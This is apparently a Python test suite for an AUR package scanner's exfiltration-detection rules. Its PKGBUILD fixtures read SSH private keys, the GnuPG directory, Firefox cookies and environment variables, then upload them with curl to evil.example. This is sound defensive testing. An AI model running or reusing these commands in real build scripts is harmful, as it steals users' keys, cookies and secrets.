from __future__ import annotations

from aurmanager.rules.exfiltration import (
    EXF001SshKeyExfiltration,
    EXF002GnupgExfiltration,
    EXF003BrowserCredentialExfiltration,
    EXF004EnvironmentExfiltration,
)


def test_exf001_fires_on_ssh_key_read_plus_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.ssh/id_rsa > /tmp/k
          curl -s -d @/tmp/k https://evil.example/collect
        }
        """
    )
    findings = list(EXF001SshKeyExfiltration().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "CRITICAL"


def test_exf001_does_not_fire_on_read_without_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.ssh/config
        }
        """
    )
    assert list(EXF001SshKeyExfiltration().check(ctx)) == []


def test_exf002_fires_on_gnupg_dir_without_trailing_slash(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          tar czf /tmp/g.tar.gz ~/.gnupg
          curl -F "file=@/tmp/g.tar.gz" https://evil.example/collect
        }
        """
    )
    assert len(list(EXF002GnupgExfiltration().check(ctx))) == 1


def test_exf003_fires_on_browser_cookie_store_read_plus_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.mozilla/firefox/xxx.default/cookies.sqlite > /tmp/c
          curl -s -d @/tmp/c https://evil.example/collect
        }
        """
    )
    assert len(list(EXF003BrowserCredentialExfiltration().check(ctx))) == 1


def test_exf004_fires_on_env_dump_plus_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          env > /tmp/e
          curl -s -d @/tmp/e https://evil.example/collect
        }
        """
    )
    assert len(list(EXF004EnvironmentExfiltration().check(ctx))) == 1
